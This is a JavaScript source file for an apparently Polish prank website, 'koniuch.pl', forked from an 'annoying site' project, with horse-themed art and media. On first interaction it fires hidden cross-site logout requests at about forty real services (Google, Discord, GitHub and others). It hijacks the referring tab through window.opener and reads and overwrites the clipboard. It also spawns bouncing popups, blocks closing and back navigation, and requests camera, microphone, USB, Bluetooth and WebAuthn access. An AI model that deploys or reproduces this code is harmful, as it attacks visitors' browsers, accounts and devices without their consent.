const SCREEN_WIDTH = window.screen.availWidth
const SCREEN_HEIGHT = window.screen.availHeight
const WIN_WIDTH = 480
const WIN_HEIGHT = 260
const VELOCITY = 15
const MARGIN = 10
const TICK_LENGTH = 50

const HIDDEN_STYLE = 'position: fixed; width: 1px; height: 1px; overflow: hidden; top: -10px; left: -10px;'

const ART = [
  `
┊┊ ☆┊┊┊┊☆┊┊☆ ┊┊┊┊┊
┈┈┈┈╭━━━━━━╮┊☆ ┊┊
┈☆ ┈┈┃╳╳╳▕╲▂▂╱▏┊┊
┈┈☆ ┈┃╳╳╳▕▏◣ ◢▕▏┊┊
┈┈╰━┫╳╳╳▕▏▔▔▏┊┊
☆ ┈┈┈┃╳╳╳╳╲▂▂╱┊┊┊
┊┊☆┊╰┳┳━━┳┳╯┊ ┊ ☆┊
   (  koń  )
  `,
  `
░░▓▓░░░░░░░░▓▓░░
░▓▒▒▓░░░░░░▓▒▒▓░
░▓▒▒▒▓░░░░▓▒▒▒▓░
░▓▒▒▒▒▓▓▓▓▒▒▒▒▓░
░▓▒▒▒▒▒▒▒▒▒▒▒▒▒▓
▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓
▓▒▒▒░▓▒▒▒▒▒░▓▒▒▓
▓▒▒▒▓▓▒▒▒▓▒▓▓▒▒▓
▓▒░░▒▒▒▒▒▒▒▒▒░░▓
▓▒░░▒▓▒▒▓▒▒▓▒░░▓
░▓▒▒▒▓▓▓▓▓▓▓▒▒▓░
░░▓▒▒▒▒▒▒▒▒▒▒▓░░
░░░▓▓▓▓▓▓▓▓▓▓░░░
     🐴 KOŃ 🐴
  `
]

const SEARCHES = [
  'jshop',
  'koniuch',
  'koń',
  'rżenie konia',
  'jaczup'
]

const VIDEOS = [
  'media/videos/caballo.gif',
  'media/videos/duck.mp4',
  'media/videos/rickroll.mp4',
  'media/videos/golomb.mp4',
  'media/videos/mushbox.mp4',
  'media/videos/clearmax.mp4',
  'media/videos/freestrona.mp4',
  'media/videos/ajhsdfhjasdbhfjasdfs.mp4',
  'media/videos/v09044g40000cgr968jc77u1t2krb89g.mov',
  'media/videos/intro.mp4',
  'media/videos/szybkikon.mp4', // added by @dan64iel
  'media/videos/koniczek.mp4', //added by @imzeme
  'media/videos/gratulacje.mp4', //added by @GameShoot8050
  'media/videos/galopik.mp4' //added by @MariaWasNotAvailable
]

const FILE_DOWNLOADS = [
  'media/images/konik.jpg',
  'media/images/koniuszek.jpg',
  'media/images/kon.jpg',
  'media/images/kasti.jpg',
  'media/images/ai.png',
  'media/images/konno.jpg',
  'media/images/lubiekonie.jpg',
  'media/images/cojest.jpg', // added by @dan64iel
  'media/images/smieszny.jpg', //added by @imzeme
  'media/images/hmmm.jpg', //added by @imzeme
  'media/images/kaska.jpg', //added by @MARECKIyt
  'media/images/kon2.jpg',
]

const PHRASES = [
  'hello my name is koniuch, lol',
  'konie są zabawne hihihihihihihihihi',
  'wgl co u cb bo u mn dbr',
  'knuuurrr eksplozja',
  'irrhaaa irrhaaa irrhaaa irrhaaa irrhaaa irrhaaa irrhaaa irrhaaa irrhaaa irrhaaa irrhaaa irrhaaa',
  'abcdefghijklmnopqrstuvwxyz abcdefghijklmnopqrstuvwxyz',
  'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaak',
  'yhaa yhaa yhaa yhaa yhaa yhaa yhaa yhaa yhaa yhaa yhaa yhaa yhaa yhaa yhaa yhaa yhaa yhaa yhaa yhaa'
]

const LOGOUT_SITES = {
  Discord: ['POST', 'https://discord.com/api/v9/auth/logout', {provider: null, voip_provider: null}],
  Amazon: ['GET', 'https://www.amazon.com/gp/flex/sign-out.html?action=sign-out'],
  DeviantART: ['POST', 'https://www.deviantart.com/users/logout'],
  Dropbox: ['GET', 'https://www.dropbox.com/logout'],
  eBay: ['GET', 'https://signin.ebay.com/ws/eBayISAPI.dll?SignIn'],
  GitHub: ['GET', 'https://github.com/logout'],
  GMail: ['GET', 'https://mail.google.com/mail/?logout'],
  Google: ['GET', 'https://www.google.com/accounts/Logout'], // works!
  Hulu: ['GET', 'https://secure.hulu.com/logout'],
  NetFlix: ['GET', 'https://www.netflix.com/Logout'],
  Skype: ['GET', 'https://secure.skype.com/account/logout'],
  SoundCloud: ['GET', 'https://soundcloud.com/logout'],
  'Steam Community': ['GET', 'https://steamcommunity.com/?action=doLogout'],
  'Steam Store': ['GET', 'https://store.steampowered.com/logout/'],
  Wikipedia: ['GET', 'https://en.wikipedia.org/w/index.php?title=Special:UserLogout'],
  'Windows Live': ['GET', 'https://login.live.com/logout.srf'],
  Wordpress: ['GET', 'https://wordpress.com/wp-login.php?action=logout'],
  Yahoo: ['GET', 'https://login.yahoo.com/config/login?.src=fpctx&logout=1&.direct=1&.done=https://www.yahoo.com/'],
  YouTube: ['POST', 'https://www.youtube.com', { action_logout: '1' }],
  JShop: ['GET', 'https://jshop.partners/panel/logout'],
  Vimeo: ['GET', 'https://vimeo.com/log_out'], // added by @intexpression
  Tumblr: ['GET', 'https://www.tumblr.com/logout'], // added by @intexpression
  Allegro: ['GET', 'https://allegro.pl/wyloguj?origin_url=/'], // added by @intexpression
  OnetMail: ['GET', 'https://authorisation.grupaonet.pl/logout.html?state=logout&client_id=poczta.onet.pl.front.onetapi.pl'], // added by @intexpression
  InteriaMail: ['GET', 'https://poczta.interia.pl/logowanie/sso/logout'], // added by @intexpression
  OLX: ['GET', 'https://www.olx.pl/account/logout'], // added by @intexpression
  Roblox:  ['POST', 'https://auth.roblox.com/v2/logout'], // added by @cryblanka
  ChatGPT: ['GET', 'https://chatgpt.com/auth/logout'], // added by @cryblanka
  Guilded:  ['POST', 'https://www.guilded.gg/api/logout'], // added by @cryblanka
  LinkedIn: ['GET', 'https://www.linkedin.com/m/logout/'], // added by @MARECKIyt
  Pinterest: ['GET', 'https://www.pinterest.com/logout/'], // added by @MARECKIyt
  Reddit: ['GET', 'https://www.reddit.com/logout'], // added by @MARECKIyt
  Spotify: ['GET', 'https://www.spotify.com/logout/'], // added by @MARECKIyt
  Microsoft: ['GET', 'https://login.microsoftonline.com/common/oauth2/logout'], // added by @MARECKIyt
  Instagram: ['GET', 'https://www.instagram.com/accounts/logout/'], // added by @MARECKIyt
  Trello: ['GET', 'https://trello.com/logout'], // added by @MARECKIyt
  Baidu: ['GET', 'https://passport.baidu.com/?logout'], // added by @MARECKIyt
  VK: ['GET', 'https://vk.com/exit'], // added by @MARECKIyt
  StackOverflow: ['GET', 'https://stackoverflow.com/users/logout'], // added by @MARECKIyt
  Asana: ['POST', 'https://app.asana.com/app/asana/-/logout'], // added by @Hyd3r1
}

/**
 * Tablica przechowująca okna potomne otwarte przez to okno.
 */
const wins = []

/**
 * Licznik liczby kliknięć - added by @9fm
 */

let interactionCount = 0

// Bardzo długi string xd, ciulowa implementacja ale to chyba lepsze niż ~4 miliony znaków w pliku po prostu - added by @9fm

const veryLongString = repeatStringNumTimes(repeatStringNumTimes('zostałeś skoniowany!!1 ',100),1500) // - added by @9fm

/**
 * Liczba iframe'ów wstrzykniętych na stronę do funkcji "super wylogowania".
 * Patrz superLogout().
 */
let numSuperLogoutIframes = 0

/**
 * Czy to okno potomne? Okno jest potomkiem, jeśli istnieje okno rodzica
 * (tzn. okno zostało otwarte przez inne okno, więc `window.opener` jest ustawione)
 * *ORAZ* ten rodzic jest oknem z tego samego pochodzenia (tzn. okno zostało
 * otwarte przez nas, a nie przez zewnętrzną stronę).
 */
const isChildWindow = (window.opener && isParentSameOrigin()) ||
  window.location.search.indexOf('child=true') !== -1

/**
 * Czy to okno rodzica?
 */
const isParentWindow = !isChildWindow

/*
 * Uruchom ten kod we wszystkich oknach, *zarówno* potomnych, jak i rodzica.
 */

init()

/*
 * Użyj `window.opener`, aby wykryć, czy to okno zostało otwarte przez inne okno,
 * które będzie jego rodzicem. Zmienna `window.opener` to referencja do okna rodzica.
 */
if (isChildWindow) initChildWindow()
else initParentWindow()

/**
 * Inicjalizacja dla *obu* typów okien: rodzica i potomnych.
 */
function init () {
  confirmPageUnload()

  interceptUserInput(event => {
    interactionCount += 1

    // Zapobiegaj domyślnemu zachowaniu (psuje skróty zamykania okna)
    event.preventDefault()
    event.stopPropagation()

    // Zdarzenia 'touchstart' i 'touchend' nie mogą otwierać nowego okna
    // (przynajmniej w Chrome), więc nawet nie próbuj. Sprawdzenie `event.which !== 0`
    // to sprytny sposób na wykluczenie zdarzeń dotykowych.
    if (event.which !== 0) openWindow()

    startVibrateInterval()
    enablePictureInPicture()
    triggerFileDownload()

    focusWindows()
    copySpamToClipboard()
    speak()
    startTheramin()

    // Przechwyć naciśnięcia klawiszy Command lub Control, aby zakłócić
    // skrót "Zamknij okno".
    if (event.key === 'Meta' || event.key === 'Control') {
      window.print()
      requestWebauthnAttestation()
      window.print()
      requestWebauthnAttestation()
      window.print()
      requestWebauthnAttestation()
    } else {
      requestPointerLock()

      if (!window.ApplePaySession) {
        // Nie proś o TouchID przy każdej interakcji w Safari, bo blokuje
        // pętlę zdarzeń i zatrzymuje ruch okien
        requestWebauthnAttestation()
      }
      requestClipboardRead()
      requestMidiAccess()
      requestBluetoothAccess()
      requestUsbAccess()
      requestSerialAccess()
      requestHidAccess()
      requestCameraAndMic()
      requestFullscreen()
    }
  })
}

/**
 * Inicjalizacja dla okien potomnych.
 */
function initChildWindow () {
  registerProtocolHandlers()
  hideCursor()
  moveWindowBounce()
  startVideo()
  detectWindowClose()
  triggerFileDownload()
  speak()
  rainbowThemeColor()
  animateUrlWithEmojis()

  interceptUserInput(event => {
    if (interactionCount === 1) {
      startAlertInterval()
    }
  })
}

/**
 * Inicjalizacja dla okna rodzica.
 */
function initParentWindow () {
  showHelloMessage()
  blockBackButton()
  fillHistory()
  startInvisiblePictureInPictureVideo()

  interceptUserInput(event => {
    // Uruchom to tylko przy pierwszej interakcji
    if (interactionCount === 1) {
      registerProtocolHandlers()
      attemptToTakeoverReferrerWindow()
      hideCursor()
      startVideo()
      startAlertInterval()
      superLogout()
      removeHelloMessage()
      rainbowThemeColor()
      animateUrlWithEmojis()
      speak('To był błąd')
    }
  })
}

/**
 * Strony, które linkują do koniuch.pl, mogą podać `target='_blank'`, aby otworzyć
 * link w nowym oknie. Wtedy `window.opener` jest ustawione, co pozwala nam
 * przekierować to okno. TAK, MOŻEMY PRZEKIEROWAĆ STRONĘ, KTÓRA DO NAS LINKOWAŁA.
 * Więcej tutaj: https://www.jitbit.com/alexblog/256-targetblank---the-most-underestimated-vulnerability-ever/
 */
function attemptToTakeoverReferrerWindow () {
  if (isParentWindow && window.opener && !isParentSameOrigin()) {
    window.opener.location = `${window.location.origin}/?child=true`
  }
}

/**
 * Zwraca true, jeśli okno rodzica jest z tego samego pochodzenia. Nie wystarczy
 * sprawdzić, czy `window.opener` jest ustawione, bo to też się zdarzy, gdy strona
 * z innego pochodzenia linkuje do koniuch.pl z `target='_blank'`.
 */
function isParentSameOrigin () {
  try {
    // Może rzucić wyjątkiem, jeśli `window.opener` jest z innego pochodzenia
    return window.opener.location.origin === window.location.origin
  } catch (err) {
    return false
  }
}

/**
 * Zapytaj użytkownika "czy na pewno chcesz opuścić tę stronę?". W większości
 * przeglądarek nie zrobi to nic, chyba że użytkownik wykonał przynajmniej
 * jedną interakcję ze stroną przed jej zamknięciem.
 */
function confirmPageUnload () {
  window.addEventListener('beforeunload', event => {
    speak('Please don\'t go!')
    event.returnValue = true
  })
}

/**
 * Spróbuj zarejestrować wszystkie możliwe protokoły dozwolone przez przeglądarkę,
 * aby były obsługiwane przez tę aplikację zamiast domyślnych handlerów.
 */
function registerProtocolHandlers () {
  if (typeof navigator.registerProtocolHandler !== 'function') return

  const protocolWhitelist = [
    'bitcoin',
    'geo',
    'im',
    'irc',
    'ircs',
    'magnet',
    'mailto',
    'mms',
    'news',
    'ircs',
    'nntp',
    'sip',
    'sms',
    'smsto',
    'ssh',
    'tel',
    'urn',
    'webcal',
    'wtai',
    'xmpp'
  ]

  const handlerUrl = window.location.href + '/url=%s'

  protocolWhitelist.forEach(proto => {
    navigator.registerProtocolHandler(proto, handlerUrl, 'Koniuch')
  })
}

/**
 * Spróbuj uzyskać dostęp do kamery i mikrofonu użytkownika oraz spróbuj włączyć
 * latarkę (lampę błyskową), jeśli urządzenie ją posiada.
 */
function requestCameraAndMic () {
  if (!navigator.mediaDevices ||
      typeof navigator.mediaDevices.getUserMedia !== 'function') {
    return
  }

  navigator.mediaDevices.enumerateDevices().then(devices => {
    const cameras = devices.filter((device) => device.kind === 'videoinput')

    if (cameras.length === 0) return
    const camera = cameras[cameras.length - 1]

    navigator.mediaDevices.getUserMedia({
      deviceId: camera.deviceId,
      facingMode: ['user', 'environment'],
      audio: true,
      video: true
    }).then(stream => {
      const track = stream.getVideoTracks()[0]
      const imageCapture = new window.ImageCapture(track)

      imageCapture.getPhotoCapabilities().then(() => {
        // Niech się stanie światło!
        track.applyConstraints({ advanced: [{ torch: true }] })
      }, () => { /* Brak latarki w tym urządzeniu */ })
    }, () => { /* ignoruj błędy */ })
  })
}

/**
 * Animowanie URL emoji.
 * Zobacz: https://matthewrayfield.com/articles/animating-urls-with-javascript-and-emojis/
 */
function animateUrlWithEmojis () {
  if (window.ApplePaySession) {
    // Safari i tak nie pokazuje pełnego URL, więc nie możemy go animować
    return
  }
  const rand = Math.random()
  if (rand < 0.33) {
    animateUrlWithHorses()
  } else if (rand < 0.67) {
    animateUrlWithWave()
  } else {
    animateUrlWithMoons()
  }

  function animateUrlWithHorses () {
    const e = ['🐎', '🐴', '🦄', '🐎', '🐴']

    setInterval(() => {
      let s = ''
      let i; let m

      for (i = 0; i < 10; i++) {
        m = Math.floor(e.length * ((Math.sin((Date.now() / 100) + i) + 1) / 2))
        s += e[m]
      }

      window.location.hash = s
    }, 100)
  }

  function animateUrlWithWave () {
    setInterval(() => {
      let i; let n; let s = ''

      for (i = 0; i < 10; i++) {
        n = Math.floor(Math.sin((Date.now() / 200) + (i / 2)) * 4) + 4

        s += String.fromCharCode(0x2581 + n)
      }

      window.location.hash = s
    }, 100)
  }

  function animateUrlWithMoons () {
    const f = ['🌑', '🌘', '🌗', '🌖', '🌕', '🌔', '🌓', '🌒']
    const d = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
    let m = 0

    setInterval(() => {
      let s = ''
      let x = 0

      if (!m) {
        while (d[x] === 4) {
          x++
        }

        if (x >= d.length) m = 1
        else {
          d[x]++
        }
      } else {
        while (d[x] === 0) {
          x++
        }

        if (x >= d.length) m = 0
        else {
          d[x]++

          if (d[x] === 8) d[x] = 0
        }
      }

      d.forEach(function (n) {
        s += f[n]
      })

      window.location.hash = s
    }, 100)
  }
}

/**
 * Zablokuj wskaźnik użytkownika, nawet nie będąc w pełnym ekranie!
 * Wymaga zdarzenia zainicjowanego przez użytkownika.
 */
function requestPointerLock () {
  const requestPointerLockApi = (
    document.body.requestPointerLock ||
    document.body.webkitRequestPointerLock ||
    document.body.mozRequestPointerLock ||
    document.body.msRequestPointerLock
  )

  requestPointerLockApi.call(document.body)
}

/**
 * Zacznij wibrować urządzenie w losowych odstępach, na obsługiwanych urządzeniach.
 * Wymaga zdarzenia zainicjowanego przez użytkownika.
 */
function startVibrateInterval () {
  if (typeof window.navigator.vibrate !== 'function') return
  setInterval(() => {
    const duration = Math.floor(Math.random() * 600)
    window.navigator.vibrate(duration)
  }, 1000)

  // Jeśli gamepad umie wibrować, będziemy to robić w losowych odstępach co sekundę.
  // I z losową siłą!
  window.addEventListener('gamepadconnected', (event) => {
    const gamepad = event.gamepad
    if (gamepad.vibrationActuator) {
      setInterval(() => {
        if (gamepad.connected) {
          gamepad.vibrationActuator.playEffect('dual-rumble', {
            duration: Math.floor(Math.random() * 600),
            strongMagnitude: Math.random(),
            weakMagnitude: Math.random()
          })
        }
      }, 1000)
    }
  })
}

/**
 * Przechwytuj wszystkie zdarzenia zainicjowane przez użytkownika i wywołuj podaną
 * funkcję, `onInput`.
 */
function interceptUserInput (onInput) {
  document.body.addEventListener('touchstart', onInput, { passive: false })

  document.body.addEventListener('mousedown', onInput)
  document.body.addEventListener('mouseup', onInput)
  document.body.addEventListener('click', onInput)

  document.body.addEventListener('keydown', onInput)
  document.body.addEventListener('keyup', onInput)
  document.body.addEventListener('keypress', onInput)
}

/**
 * Uruchom niewidoczne, wyciszone wideo, aby mieć jedno gotowe do umieszczenia
 * w trybie obraz w obrazie przy pierwszej interakcji użytkownika.
 */
function startInvisiblePictureInPictureVideo () {
  const video = document.createElement('video')
  video.src = getRandomArrayEntry(VIDEOS)
  video.loop = true
  video.muted = true
  video.style = HIDDEN_STYLE
  video.autoplay = true
  video.play()

  document.body.appendChild(video)
}

/**
 * Aktywuj funkcję obraz w obrazie Safari, która pozwala pokazać wideo na pulpicie.
 * Wymaga zdarzenia zainicjowanego przez użytkownika.
 */
function enablePictureInPicture () {
  const video = document.querySelector('video')
  if (document.pictureInPictureEnabled) {
    video.style = ''
    video.muted = false
    video.requestPictureInPicture()
    video.play()
  }
}

/**
 * Ustaw fokus na wszystkich oknach potomnych. Wymaga zdarzenia zainicjowanego
 * przez użytkownika.
 */
function focusWindows () {
  wins.forEach(win => {
    if (!win.closed) win.focus()
  })
}

/**
 * Otwórz nowe okno popup. Wymaga zdarzenia zainicjowanego przez użytkownika.
 */
function openWindow () {
  const { x, y } = getRandomCoords()
  const opts = `width=${WIN_WIDTH},height=${WIN_HEIGHT},left=${x},top=${y}`
  const win = window.open(window.location.pathname, '', opts)

  // Nowe okna mogą zostać zablokowane przez blokadę popupów
  if (!win) return
  wins.push(win)

  if (wins.length === 2) setupSearchWindow(win)

  // Added by @wetraks
  win.onunload = function () {
    // Niektóre przeglądarki mogą nie obsługiwać onunload, ale zostawiamy dla kompletności
    return false;
  };

  // Dla nowoczesnych przeglądarek
  win.addEventListener("beforeunload", function (e) {
    e.preventDefault();
    e.returnValue = "";
  });

  // Dla starszych przeglądarek
  win.onbeforeunload = function () {
    return "";
  };
  // Added by @wetraks
}

/**
 * Ukryj kursor użytkownika!
 */
function hideCursor () {
  document.querySelector('html').style = 'cursor: none;'
}

/**
 * Wywołaj pobranie pliku natychmiast. Jedno pobranie pliku jest dozwolone *bez*
 * interakcji użytkownika. Kolejne pobrania powinny odbywać się w odpowiedzi na
 * zdarzenie zainicjowane przez użytkownika, w przeciwnym razie zostaną zablokowane.
 */
function triggerFileDownload () {
  const fileName = getRandomArrayEntry(FILE_DOWNLOADS)
  const a = document.createElement('a')
  a.href = fileName
  a.download = fileName
  a.click()
}

/**
 * Wypowiedz podaną `phrase` za pomocą syntezy mowy.
 */
function speak (phrase) {
  if (phrase == null) phrase = getRandomArrayEntry(PHRASES)
  window.speechSynthesis.speak(new window.SpeechSynthesisUtterance(phrase))
}

/**
 * Uruchom irytujące theremin, który zmienia wysokość i głośność w zależności
 * od pozycji myszy. Używa oscylatora Web Audio. Wymaga zdarzenia zainicjowanego
 * przez użytkownika.
 * Na podstawie https://github.com/feross/TheAnnoyingSite.com/pull/2
 */
function startTheramin () {
  const audioContext = new AudioContext()
  const oscillatorNode = audioContext.createOscillator()
  const gainNode = audioContext.createGain()

  const pitchBase = 50
  const pitchRange = 4000

  const wave = audioContext.createPeriodicWave(
    Array(10).fill(0).map((v, i) => Math.cos(i)),
    Array(10).fill(0).map((v, i) => Math.sin(i))
  )

  oscillatorNode.setPeriodicWave(wave)

  oscillatorNode.connect(gainNode)
  gainNode.connect(audioContext.destination)

  oscillatorNode.start(0)

  const oscillator = ({ pitch, volume }) => {
    oscillatorNode.frequency.value = pitchBase + pitch * pitchRange
    gainNode.gain.value = volume * 3
  }

  document.body.addEventListener('mousemove', event => {
    const { clientX, clientY } = event
    const { clientWidth, clientHeight } = document.body
    const pitch = (clientX - clientWidth / 2) / clientWidth
    const volume = (clientY - clientHeight / 2) / clientHeight
    oscillator({ pitch, volume })
  })
}

/**
 * Spróbuj odczytać schowek użytkownika.
 * Wymaga zdarzenia zainicjowanego przez użytkownika.
 */
function requestClipboardRead () {
  try {
    navigator.clipboard.readText().then(
      data => {
        if (!window.ApplePaySession) {
          // Nie pokazuj alertu w Safari, bo blokuje pętlę zdarzeń
          window.alert("Udało się odczytać dane ze schowka: '" + data + "'")
        }
      },
      () => {}
    )
  } catch {}
}

/**
 * Poproś o atestację Webauthn.
 * Wymaga zdarzenia zainicjowanego przez użytkownika.
 */
function requestWebauthnAttestation () {
  try {
    // Z https://developer.mozilla.org/en-US/docs/Web/API/Web_Authentication_API
    // Ten kod jest domeną publiczną, zgodnie z https://developer.mozilla.org/en-US/docs/MDN/About#Copyrights_and_licenses

    // przykładowe argumenty do rejestracji
    const createCredentialDefaultArgs = {
      publicKey: {
      // Relying Party (czyli usługa):
        rp: {
          name: 'Acme'
        },

        // Użytkownik:
        user: {
          id: new Uint8Array(16),
          name: 'gej',
          displayName: 'Koniuch'
        },

        pubKeyCredParams: [{
          type: 'public-key',
          alg: -7
        }],

        attestation: 'direct',

        timeout: 60000,

        challenge: new Uint8Array([ // musi być kryptograficznie losową liczbą wysłaną z serwera
          0x8C, 0x0A, 0x26, 0xFF, 0x22, 0x91, 0xC1, 0xE9, 0xB9, 0x4E, 0x2E, 0x17, 0x1A, 0x98, 0x6A, 0x73,
          0x71, 0x9D, 0x43, 0x48, 0xD5, 0xA7, 0x6A, 0x15, 0x7E, 0x38, 0x94, 0x52, 0x77, 0x97, 0x0F, 0xEF
        ]).buffer
      }
    }

    // przykładowe argumenty do logowania
    const getCredentialDefaultArgs = {
      publicKey: {
        timeout: 60000,
        // allowCredentials: [newCredential] // patrz niżej
        challenge: new Uint8Array([ // musi być kryptograficznie losową liczbą wysłaną z serwera
          0x79, 0x50, 0x68, 0x71, 0xDA, 0xEE, 0xEE, 0xB9, 0x94, 0xC3, 0xC2, 0x15, 0x67, 0x65, 0x26, 0x22,
          0xE3, 0xF3, 0xAB, 0x3B, 0x78, 0x2E, 0xD5, 0x6F, 0x81, 0x26, 0xE2, 0xA6, 0x01, 0x7D, 0x74, 0x50
        ]).buffer
      }
    }

    // zarejestruj / utwórz nowe poświadczenie
    navigator.credentials.create(createCredentialDefaultArgs)
      .then((cred) => {
      // normalnie identyfikatory poświadczeń dostępne dla konta pochodziłyby z serwera
      // ale możemy je po prostu skopiować z powyższego...
        const idList = [{
          id: cred.rawId,
          transports: ['usb', 'nfc', 'ble'],
          type: 'public-key'
        }]
        getCredentialDefaultArgs.publicKey.allowCredentials = idList
        return navigator.credentials.get(getCredentialDefaultArgs)
      })
  } catch {}
}

/**
 * Poproś o dostęp do urządzeń MIDI.
 * Wymaga zdarzenia zainicjowanego przez użytkownika.
 */
function requestMidiAccess () {
  try {
    navigator.requestMIDIAccess({
      sysex: true
    })
  } catch {}
}

/**
 * Poproś o dostęp do urządzeń Bluetooth.
 * Wymaga zdarzenia zainicjowanego przez użytkownika.
 */
function requestBluetoothAccess () {
  try {
    navigator.bluetooth.requestDevice({
      // filters: [...] <- Preferuj filtry, aby oszczędzać energię i pokazywać istotne urządzenia.
      // acceptAllDevices tutaj zapewnia wypełnienie okna dialogowego, nie zależy nam z czym.
      acceptAllDevices: true
    })
      .then(device => device.gatt.connect())
  } catch {}
}

/**
 * Poproś o dostęp do urządzeń USB.
 * Wymaga zdarzenia zainicjowanego przez użytkownika.
 */
function requestUsbAccess () {
  try {
    navigator.usb.requestDevice({ filters: [{}] })
  } catch {}
}

/**
 * Poproś o dostęp do urządzeń szeregowych (Serial).
 * Wymaga zdarzenia zainicjowanego przez użytkownika.
 */
function requestSerialAccess () {
  try {
    navigator.serial.requestPort({ filters: [] })
  } catch {}
}

/**
 * Poproś o dostęp do urządzeń HID.
 * Wymaga zdarzenia zainicjowanego przez użytkownika.
 */
function requestHidAccess () {
  try {
    navigator.hid.requestDevice({ filters: [] })
  } catch {}
}

/**
 * Poruszaj oknem po ekranie i odbijaj je od krawędzi ekranu.
 */
function moveWindowBounce () {
  let vx = VELOCITY * (Math.random() > 0.5 ? 1 : -1)
  let vy = VELOCITY * (Math.random() > 0.5 ? 1 : -1)

  setInterval(() => {
    const x = window.screenX
    const y = window.screenY
    const width = window.outerWidth
    const height = window.outerHeight

    if (x < MARGIN) vx = Math.abs(vx)
    if (x + width > SCREEN_WIDTH - MARGIN) vx = -1 * Math.abs(vx)
    if (y < MARGIN + 20) vy = Math.abs(vy)
    if (y + height > SCREEN_HEIGHT - MARGIN) vy = -1 * Math.abs(vy)

    window.moveBy(vx, vy)
  }, TICK_LENGTH)
}

/**
 * Pokaż losowe głupie wideo w oknie.
 */
function startVideo () {
  const video = document.createElement('video')

  video.src = getRandomArrayEntry(VIDEOS)
  video.autoplay = true
  video.loop = true
  video.style = 'width: 100%; height: 100%;'

  document.body.appendChild(video)
}

/**
 * Gdy okno potomne się zamyka, powiadom okno rodzica, aby mogło je usunąć
 * z listy okien potomnych.
 */
function detectWindowClose () {
  window.addEventListener('unload', () => {
    if (!window.opener.closed) window.opener.onCloseWindow(window)
  })
}

/**
 * Obsłuż zamknięcie okna potomnego.
 */
function onCloseWindow (win) {
  const i = wins.indexOf(win)
  if (i >= 0) wins.splice(i, 1)
}

/**
 * Pokaż niczego niespodziewającemu się użytkownikowi przyjazną wiadomość powitalną
 * z koniem.
 */
function showHelloMessage () {
  const template = document.querySelector('template')
  const clone = document.importNode(template.content, true)
  document.body.appendChild(clone)
}

/**
 * Usuń wiadomość powitalną.
 */
function removeHelloMessage () {
  const helloMessage = document.querySelector('.hello-message')
  helloMessage.remove()
}

/**
 * Zmieniaj kolor motywu przeglądarki w pętli.
 */
function rainbowThemeColor () {
  function zeroFill (width, number, pad = '0') {
    width -= number.toString().length
    if (width > 0) return new Array(width + (/\./.test(number) ? 2 : 1)).join(pad) + number
    return number + ''
  }

  const meta = document.querySelector('meta.theme-color')
  setInterval(() => {
    meta.setAttribute('content', '#' + zeroFill(6, Math.floor(Math.random() * 16777215).toString(16)))
  }, 50)
}
function repeatStringNumTimes(string, times) {
  var repeatedString = "";
  while (times > 0) {
    repeatedString += string;
    times--;
  }
  return repeatedString;
}
/**
 * Kopiuje ~4 miliony znaków do schowka  - added by @9fm
 */

function copySpamToClipboard () {
  clipboardCopy(veryLongString)
}

/**
 * Skopiuj podany tekst, `text`, do schowka użytkownika.
 * Wymaga zdarzenia zainicjowanego przez użytkownika.
 */
function clipboardCopy (text) {
  // <span> zawiera tekst do skopiowania
  const span = document.createElement('span')
  span.textContent = text
  span.style.whiteSpace = 'pre' // Zachowaj kolejne spacje i nowe linie

  // <iframe> izoluje <span> od stylów strony
  const iframe = document.createElement('iframe')
  iframe.sandbox = 'allow-same-origin'
  document.body.appendChild(iframe)

  let win = iframe.contentWindow
  win.document.body.appendChild(span)

  let selection = win.getSelection()

  // Firefox nie potrafi pobrać zaznaczenia z okna <iframe>, więc fallback
  if (!selection) {
    win = window
    selection = win.getSelection()
    document.body.appendChild(span)
  }

  const range = win.document.createRange()
  selection.removeAllRanges()
  range.selectNode(span)
  selection.addRange(range)

  let success = false
  try {
    success = win.document.execCommand('copy')
  } catch (err) {
    console.log(err)
  }

  selection.removeAllRanges()
  span.remove()
  iframe.remove()

  return success
}

/**
 * Pokazuj modalne okno dialogowe w regularnych odstępach. Modale przechwytują
 * fokus z innych aplikacji systemowych i kart przeglądarki. Z wyjątkiem Chrome 64+,
 * gdzie modale mogą przechwytywać fokus tylko z innych aplikacji systemowych,
 * ale nie z innych kart.
 */
function startAlertInterval () {
  setInterval(() => {
    if (Math.random() < 0.5) {
      showAlert()
    } else {
      window.print()
    }
  }, 30000)
}

/**
 * Pokaż alert z tysiącami linii koniowej sztuki ASCII.
 */
function showAlert () {
  const randomArt = getRandomArrayEntry(ART)
  const longAlertText = Array(200).join(randomArt)
  window.alert(longAlertText)
}

/**
 * Ustaw okno przeglądarki w tryb pełnoekranowy
 */
function requestFullscreen () {
  const requestFullscreen = Element.prototype.requestFullscreen ||
    Element.prototype.webkitRequestFullscreen ||
    Element.prototype.mozRequestFullScreen ||
    Element.prototype.msRequestFullscreen

  requestFullscreen.call(document.body)
}

/**
 * Wyloguj użytkownika z popularnych stron, na których jest zalogowany,
 * w tym Google.com.
 * Zainspirowane przez https://superlogout.com
 */
function superLogout () {
  function cleanup (el, delayCleanup) {
    if (delayCleanup) {
      delayCleanup = false
      return
    }
    el.parentNode.removeChild(el)
  }

  function get (url) {
    const img = document.createElement('img')
    img.onload = () => cleanup(img)
    img.onerror = () => cleanup(img)
    img.style = HIDDEN_STYLE
    document.body.appendChild(img)
    img.src = url
  }

  function post (url, params) {
    const iframe = document.createElement('iframe')
    iframe.style = HIDDEN_STYLE
    iframe.name = 'iframe' + numSuperLogoutIframes
    document.body.appendChild(iframe)

    numSuperLogoutIframes += 1

    const form = document.createElement('form')
    form.style = HIDDEN_STYLE

    let numLoads = 0
    iframe.onload = iframe.onerror = () => {
      if (numLoads >= 1) cleanup(iframe)
      numLoads += 1
    }
    form.action = url
    form.method = 'POST'
    form.target = iframe.name

    for (const param in params) {
      if (Object.prototype.hasOwnProperty.call(params, param)) {
        const input = document.createElement('input')
        input.type = 'hidden'
        input.name = param
        input.value = params[param]
        form.appendChild(input)
      }
    }

    document.body.appendChild(form)
    form.submit()
  }
  for (const name in LOGOUT_SITES) {
    const method = LOGOUT_SITES[name][0]
    const url = LOGOUT_SITES[name][1]
    const params = LOGOUT_SITES[name][2] || {}

    if (method === 'GET') {
      get(url)
    } else {
      post(url, params)
    }

    const div = document.createElement('div')
    div.innerText = `Wylogowywanie się z ${name}...`

    const logoutMessages = document.querySelector('.logout-messages')
    logoutMessages.appendChild(div)
  }
}

/**
